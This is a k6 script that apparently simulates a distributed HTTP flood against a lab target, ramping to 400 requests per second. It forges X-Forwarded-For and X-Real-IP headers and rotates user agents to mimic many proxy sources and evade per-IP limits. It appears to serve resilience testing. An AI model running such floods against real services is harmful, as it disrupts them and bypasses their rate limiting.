import http from "k6/http";
import { check, sleep } from "k6";
import { Rate, Counter } from "k6/metrics";

// =============================================================
// DDoS Simulation: Distributed Attack via Multiple Proxies
// Simulates traffic coming from different proxy sources
// =============================================================

const errorRate = new Rate("errors");
const proxyHits = new Counter("proxy_requests");

export const options = {
  scenarios: {
    distributed_flood: {
      executor: "ramping-arrival-rate",
      startRate: 5,
      timeUnit: "1s",
      stages: [
        { duration: "15s", target: 50 },
        { duration: "30s", target: 200 },
        { duration: "30s", target: 400 },
        { duration: "15s", target: 10 },
      ],
      preAllocatedVUs: 300,
    },
  },
};

const TARGET_URL = __ENV.TARGET_URL || "http://target:80";

// Simulate multiple proxy sources with spoofed IPs
const proxyIPs = [];
for (let i = 1; i <= 50; i++) {
  proxyIPs.push(`192.168.${Math.floor(i / 255)}.${i % 255}`);
}

const methods = ["GET", "POST"];
const paths = ["/", "/api/data", "/health", "/api/data?q=test", "/api/data?page=1"];

export default function () {
  const path = paths[Math.floor(Math.random() * paths.length)];
  const method = methods[Math.floor(Math.random() * methods.length)];
  const spoofedIP = proxyIPs[Math.floor(Math.random() * proxyIPs.length)];
  const url = `${TARGET_URL}${path}`;

  const params = {
    headers: {
      "User-Agent": randomUserAgent(),
      "X-Forwarded-For": spoofedIP,
      "X-Real-IP": spoofedIP,
    },
    timeout: "10s",
  };

  let res;
  if (method === "GET") {
    res = http.get(url, params);
  } else {
    res = http.post(url, JSON.stringify({ data: "flood" }), {
      ...params,
      headers: { ...params.headers, "Content-Type": "application/json" },
    });
  }

  proxyHits.add(1);
  errorRate.add(res.status !== 200);

  check(res, {
    "status is 200": (r) => r.status === 200,
  });
}

function randomUserAgent() {
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

export function handleSummary(data) {
  console.log("\n====== DISTRIBUTED PROXY FLOOD REPORT ======");
  console.log(`Total Requests:     ${data.metrics.http_reqs.values.count}`);
  console.log(`Proxy IPs Used:     ${proxyIPs.length}`);
  console.log(`Avg Response Time:  ${data.metrics.http_req_duration.values.avg.toFixed(2)}ms`);
  console.log(`P95 Response Time:  ${data.metrics.http_req_duration.values["p(95)"].toFixed(2)}ms`);
  console.log(`Error Rate:         ${(data.metrics.errors.values.rate * 100).toFixed(2)}%`);
  console.log(`Requests/sec:       ${data.metrics.http_reqs.values.rate.toFixed(2)}`);
  console.log("=============================================\n");

  return {
    stdout: JSON.stringify(data.metrics, null, 2),
  };
}
